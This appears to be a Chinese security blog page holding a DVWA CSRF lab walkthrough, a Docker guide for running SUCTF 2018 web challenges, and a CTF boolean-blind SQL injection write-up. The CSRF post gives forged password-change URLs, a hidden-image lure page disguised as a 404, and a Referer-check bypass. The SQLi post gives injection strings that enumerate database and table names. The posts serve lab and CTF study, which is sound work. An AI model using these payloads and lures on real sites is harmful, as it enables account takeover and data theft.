+<h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><p>服务器核心代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Do the passwords match? </span><br><span class="line">    if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        // They do! </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        // Update the database </span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; </span><br><span class="line">        $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for the user </span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Issue with passwords matching </span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p> 服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）。</p>
+<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p> 构造payload如下:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</span><br></pre></td></tr></table></figure></p>
+<p> 可以看到密码修改成功，这时候admin的密码已经被改为password了<br> <img src="http://p1vrkwaxt.bkt.clouddn.com/Y@~%28IK%7BZGDKIR2@NYGO7II0.png" alt="image"><br></p>
+<p> 这方法是比较低级的,一般人都能看出来链接是修改密码的操作,可以用短网址方法<br><a href="http://dwz.cn/" target="_blank" rel="noopener">http://dwz.cn/</a> （域名为ip的是无法生成短网址的）</p>
+<p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>现实攻击场景下，可以在远程服务器上传一个攻击页面,引诱受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。（因为没有域名，怕被黑客GG，这里不放出本人的服务器ip),在远程服务器写一个hack.html，代码如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://localhost/dvwa/vulnerabilities/csrf/?password_new=111111&amp;password_conf=111111&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样对方点开后会认为是url失效了，实际上里面的代码执行了(这里我用的火狐浏览器打开的远程文件，在360安全浏览器等等是无法成功执行命令的，因为Cookie);<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/J6P2ODM4NU5GVHM@_CKD4QY.png" alt="image"></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/87%5BPK%5B$ZYXZL4YC8_Z$9E%7D5.png" alt="image"></p>
+<p>可以看到代码执行成功，原来的密码无法登上去了，说明密码已经改为你输入的密码了.</p>
+<h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>服务器核心代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; </span><br><span class="line">    // Checks to see where the request came from </span><br><span class="line">    if( eregi( $_SERVER[ &apos;SERVER_NAME&apos; ], $_SERVER[ &apos;HTTP_REFERER&apos; ] ) ) &#123; </span><br><span class="line">        // Get input </span><br><span class="line">        $pass_new  = $_GET[ &apos;password_new&apos; ]; </span><br><span class="line">        $pass_conf = $_GET[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">        // Do the passwords match? </span><br><span class="line">        if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            // They do! </span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">            // Update the database </span><br><span class="line">            $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; </span><br><span class="line">            $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">            // Feedback for the user </span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Issue with passwords matching </span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Didn&apos;t come from a trusted source </span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这里增加了eregi()函数，检查保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是localhost），希望通过这种机制抵御CSRF攻击。</p>
+<p>###　实战<br>虽然增加了这个函数，但仍然有办法绕过，将hack.html文件名改为localhost.html(自己的主机名),从而绕过eregi函数，完成一次CSRF攻击,下面抓包分析一下<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/5V1O%7D3L%259JEB2%284AUU%29OFNA.png" alt="image"></p>
+<p>可以看到 referer的localhost与host对应，再回去看DVWA，发现密码被修改了</p>
+<h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>服务器核心代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Do the passwords match? </span><br><span class="line">    if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        // They do! </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        // Update the database </span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; </span><br><span class="line">        $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for the user </span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Issue with passwords matching </span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
+<p>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。<br>试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击</p>
+<h3 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h3>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-docker" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/docker/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.539Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/docker/">Docker复现CTF Web题</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>docker下载方法及使用教程<br><a href="https://yeasy.gitbooks.io/docker_practice/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/</a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2018 SUCTF放出了docker镜像，这里我用的macbook装的docker</p>
+<h2 id="快捷步骤"><a href="#快捷步骤" class="headerlink" title="快捷步骤"></a>快捷步骤</h2><p>这里是镜像名<br></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/%60ZPULBIC%28CM%28U%7B7WM0GO%7BMX.png" alt="image"></p>
+<h3 id="0x01-获取镜像"><a href="#0x01-获取镜像" class="headerlink" title="0x01 获取镜像"></a>0x01 获取镜像</h3><p>Github Hub上有大量的高质量的镜像可以用，这里讲获取镜像命令方法</p>
+<p>从Docker镜像仓库获取镜像的命令格式为(这里任取一个镜像suctf/2018-web-homework为例子)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull suctf/2018-web-homework</span><br></pre></td></tr></table></figure>
+<p>这里命令没有给出Docker镜像仓库地址，会默认从Docker Hub获取镜像</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure>
+<p>该命令可以查看当前已存在的镜像</p>
+<h3 id="0x02-启动容器"><a href="#0x02-启动容器" class="headerlink" title="0x02 启动容器"></a>0x02 启动容器</h3><p>这里的启动容器是基于镜像新建一个容器启动,主要命令为docker run</p>
+<p>这里以刚才镜像为例子,启动容器并端口映射（这里直接讲外部访问容器命令）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 2018:80 suctf/2018-web-homework</span><br></pre></td></tr></table></figure>
+<p>-d 屏蔽执行命令的输出结果<br>-p 做端口映射，这里端口映射到本机2018端口,即127.0.0.1:2018</p>
+<h3 id="0x03-访问网址"><a href="#0x03-访问网址" class="headerlink" title="0x03 访问网址"></a>0x03 访问网址</h3><p>访问127.0.0.1如下<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/A63%28$7%7DQO$CTS8KGZ3CG4UQ.png" alt="image"></p>
+<p>可见复现成功了，在同一个局域网下，访问该docker主机电脑ip+端口也是可以的</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-DHB" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/DHB/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.539Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/DHB/">东华杯布尔盲注</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="东华杯布尔盲注"><a href="#东华杯布尔盲注" class="headerlink" title="东华杯布尔盲注"></a>东华杯布尔盲注</h1><h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a><strong>【原理】</strong></h2><p>sql布尔盲注原理</p>
+<h2 id="【目的】"><a href="#【目的】" class="headerlink" title="【目的】"></a><strong>【目的】</strong></h2><p>加强个人渗透sql的能力</p>
+<h2 id="【环境】"><a href="#【环境】" class="headerlink" title="【环境】"></a><strong>【环境】</strong></h2><p>python，ubuntu</p>
+<h2 id="【工具】"><a href="#【工具】" class="headerlink" title="【工具】"></a><strong>【工具】</strong></h2><p>python</p>
+<h2 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a><strong>【前言】</strong></h2><p>之前自己对sql注入一直很不理解，于是上去做了东华杯some words一波，看了writeup花了n个小时才理解（我果然是最菜的。。），不说了，上题目。</p>
+<p>各位大佬可以看看这个资源理解下布尔盲注原理 <a href="http://blog.csdn.net/squeen_/article/details/52767887" target="_blank" rel="noopener">http://blog.csdn.net/squeen_/article/details/52767887</a></p>
+<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a><strong>【步骤】</strong></h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/7.png" alt="image"><br>首先，这题判断过滤的特征是它回返回回显 stupid hacker233 </p>
+<p>所以试一波各种语句，发现过滤了很多，有单引号 等号 union等等，下面开始我的表演2333</p>
+<p><strong>步骤1：</strong> 爆数据库的长度</p>
+<p>语句如下<br>?id=0 or length(database())&gt;1%23 （网址我这里就暂时不打出来了，随时变化）</p>
+<p>这个语句含义是id=0时，这个库名的长度是否大于1</p>
+<p>如果不大于1的，它给你的回显如下</p>
+<p>试试把1改成2,3,4,5，到5的时候发现回显消失，说明这个库命长度为4<br><img src="http://p1vrkwaxt.bkt.clouddn.com/8.png" alt="image"><br><strong>步骤2：</strong> 爆数据库名称</p>
+<p>语句如下</p>
+<p>?id=0 or ascii(substr(database(),1,1))&gt;119– </p>
+<p>这语句的含义是以ascii的形式返回id=0时第一个字符开始后面的第一个值 然后通过与ascii匹配</p>
+<p>这里的119在ascci表中为w 这里的判断方法和步骤一是一样的<br>然后再把1,1改成，2,1，含义就是求库名的第二个字母, 以此类推得到库名为words</p>
+<p><strong>步骤3：</strong><br>接下来就是求表长度和表名称了，方法都是一样的，下面我给出语句</p>
+<p>爆表长度 id=0 or (select length(table_name) from information_schema.tables where table_schema like database()  limit 0,1)&gt;3 %23</p>
+<p>limit 0,1的含义是求第一个字符 limit 1,1的含义是求第二个字符 具体情况请百度谢谢别问我23333</p>
+<p>爆表名称 ?id=0 or (ascii(substr((select table_name from information_schema.tables where table_schema like database() limit 0,1),1,1))) &gt; 50 –+</p>
+<p>注意这里的substr和limit括号 慢慢体会，反正这个是对的</p>
+<p><strong>步骤3：</strong><br>接下来就是查字段了，可能就麻烦了，所以上神器 Python！<br>给出爆字段的脚本如下<br><img src="http://p1vrkwaxt.bkt.clouddn.com/9.png" alt="image"></p>
+<p>运行得到flag</p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/10.png" alt="image"></p>
+<h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a><strong>【总结】</strong></h2><p>感谢some words，让我在sql注入方面能力得到了提升。不废话了0.0，欢迎各位大佬慢慢看</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
+    </nav>
+  
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2018 Mr1.Grim
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
